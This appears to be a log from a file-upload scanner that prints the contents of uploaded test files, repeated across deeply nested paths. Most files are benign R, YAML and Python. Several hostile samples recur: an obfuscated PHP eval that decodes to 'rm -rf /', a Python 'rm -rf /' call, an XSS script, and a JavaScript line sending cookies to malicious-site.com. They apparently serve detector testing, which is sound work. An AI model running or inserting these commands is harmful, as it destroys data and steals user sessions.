2025-02-22 20:31:26,617 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,619 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,620 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,621 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:31:26,626 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,627 - Extracted content from uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:26,629 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:31:26,632 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:31:26,634 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:31:26,636 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:31:26,638 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,639 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:26,640 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,642 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,643 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,645 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:31:26,651 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,652 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:26,653 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:31:26,656 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:31:26,658 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:31:26,660 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:31:26,661 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,663 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:26,664 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,665 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,666 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,667 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:31:26,672 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,673 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:26,675 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,676 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,677 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,678 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,679 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,681 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:31:26,683 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,684 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:31:26,686 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,688 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,689 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,691 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,692 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,693 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,695 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:31:26,696 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,698 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:31:26,699 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,700 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,701 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,703 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,705 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,706 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,707 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/test/test/1.zip: PK   ZVZ        9      1.sqlUT
 UgEggux     vquQRpU(-N-*Vp
rsSlSr3
mؚ PK d6   9   PK   ZVZ d6   9                  1.sqlUT
 UgEggux     PK      S        
2025-02-22 20:31:26,709 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/HELLO.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,710 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/text_hidden_yaml.yaml: # Sample YAML file
users:
  - username: admin
    password: secret
  - username: attacker
    payload: "exec('malicious_code_here')"  # Hidden malicious code
2025-02-22 20:31:26,711 - Extracted content from uploads/flask_file_upload/flask_file_upload/uploads/new_test/new_test/test_brute_force.txt: hello bro
this script is for hacking sql attack and brute force attacks.
2025-02-22 20:31:26,713 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:31:26,715 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:31:26,717 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:31:26,719 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:31:26,721 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,722 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:26,723 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,724 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,725 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,726 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:31:26,732 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,733 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:26,734 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:31:26,737 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:31:26,738 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:31:26,741 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:31:26,742 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,743 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:26,744 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,745 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,746 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,747 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:31:26,753 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,754 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:26,755 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:31:26,758 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:31:26,759 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
# Input for the TbSOC And Other inputs:
tbsoc: "yes"
openocd: "no"
sign_dump: "yes"
Rv64: "yes"
spfpu: "yes"
debug: "no"
rtldump: "yes"
cocotb_sim: "yes"
atomic: "yes"
compressed: "yes"
muldiv: "yes"
usertraps: "yes"
supervisor: "yes"
user: "yes"
hypervisor: "no"
bscan2e: "yes"
# 
2025-02-22 20:31:26,761 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5-A.R: library(rpart)
age <- c(22, 24, 30, 35, 45, 50, 60, 65, 70, 75, 80, 85) 
survived <- as.factor(c(0, 0, 0, 1, 1, 0, 1, 0, 1, 1, 0, 0)) 
data <- data.frame(Age = age, Survived = survived)
model <- rpart(Survived ~ Age, data = data, method = "class", control = rpart.control(minsplit = 1))

plot(model, uniform = TRUE, margin = 0.1)
text(model, use.n = TRUE, cex = 0.8)
print(model)
2025-02-22 20:31:26,763 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/3.py: import os
os.system("rm -rf /")  # Dangerous command

2025-02-22 20:31:26,764 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/w.js: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:26,765 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/4.php: <?php
eval(base64_decode("c3lzdGVtKCJybSAtcmYgLyIpOw=="));
?>

2025-02-22 20:31:26,766 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/2.xss: <script>alert('Hacked!');</script>

2025-02-22 20:31:26,767 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/6.js: document.location = "http://malicious-site.com?cookie=" + document.cookie;

2025-02-22 20:31:26,768 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/mixed_cluster.bsv: /* 
Copyright (c) 2019, IIT Madras All rights reserved.

Redistribution and use in source and binary forms, with or without modification, are permitted
provided that the following conditions are met:

* Redistributions of source code must retain the above copyright notice, this list of conditions
  and the following disclaimer.  
* Redistributions in binary form must reproduce the above copyright notice, this list of 
  conditions and the following disclaimer in the documentation and/or other ma
2025-02-22 20:31:26,773 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/5.txt: password_list.txt
admin123
qwerty

2025-02-22 20:31:26,774 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/a.py: hello bro
this file will not contains any pattern or sql injection or brute force attack

2025-02-22 20:31:26,775 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/metadata_analysis.py: import os
import re
import zipfile
import xml.etree.ElementTree as ET
from docx import Document
from pptx import Presentation
from openpyxl import load_workbook

def extract_metadata(file_path):
    """Extract metadata from .docx, .pptx, .xlsx files"""
    metadata = {}

    try:
        if file_path.endswith(".docx"):
            doc = Document(file_path)
            metadata["Title"] = doc.core_properties.title
            metadata["Author"] = doc.core_properties.author
            metadata["C
2025-02-22 20:31:26,778 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/7-A.R: data(iris)
set.seed(123)
kmeans_model <- kmeans(iris[, -5], centers = 3)
plot(iris$Sepal.Length, iris$Sepal.Width, col = kmeans_model$cluster,
     pch = 19, xlab = "Sepal Length", ylab = "Sepal Width", 
     main = "K-Means Clustering")

2025-02-22 20:31:26,779 - Extracted content from uploads/flask_file_upload_2/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/uploads/flask_file_upload/flask_file_upload/trash/input_detail.yaml: # AXI4_LITE WIRE:
axi4_lite_paddr: 32
axi4_lite_addr: 32
# AXI4 WIRE:
axi4_paddr: 32
axi4_addr: 32
#CONFIG PARAMETER FOR BOTH AXI4 AND AXI4_LITE
config: 0
plic_num_context: 2


# TbSOC generation:
# if TbSOC is needed:
